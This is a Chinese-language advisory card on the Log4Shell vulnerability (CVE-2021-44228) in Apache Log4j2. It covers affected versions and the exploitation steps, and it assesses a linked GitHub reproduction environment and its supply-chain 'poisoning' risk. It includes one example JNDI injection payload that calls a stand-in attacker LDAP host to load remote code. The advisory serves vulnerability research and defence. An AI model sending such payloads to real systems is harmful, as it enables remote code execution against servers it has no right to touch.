## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 至 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 log4j-core 并且启用了消息查找替换功能。攻击者需要能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞。攻击者可以通过在日志消息中插入恶意的 JNDI 查找字符串，利用 JNDI 功能从远程 LDAP 服务器加载和执行任意代码。 

**利用方式：**

1.  攻击者发送包含恶意 JNDI 查找字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，到目标应用程序。
2.  如果目标应用程序使用 Log4j2 记录该请求，Log4j2 将尝试解析该 JNDI 字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**有效性：**

提供的 POC 代码（Vulhub 环境配置）有效，用于搭建一个可重现 Log4Shell 漏洞的环境。它通过 Docker-Compose 部署一个包含漏洞的 Apache Solr 实例，方便研究人员进行漏洞复现和分析。

**投毒风险：**

该仓库本身主要提供的是漏洞复现环境的配置，投毒风险较低。但是，使用任何第三方代码库或环境时，都需要谨慎评估潜在的风险。这里存在一定风险，因为攻击者可能篡改该仓库，在 LDAP 服务器返回的恶意 Java 类中植入恶意代码，使得利用漏洞时执行预期之外的操作。 因此评判投毒风险为10%，主要为潜在的供应链攻击风险。

**项目地址:** [Alan-coder-eng/log4j-cve-2021-44228-](https://github.com/Alan-coder-eng/log4j-cve-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)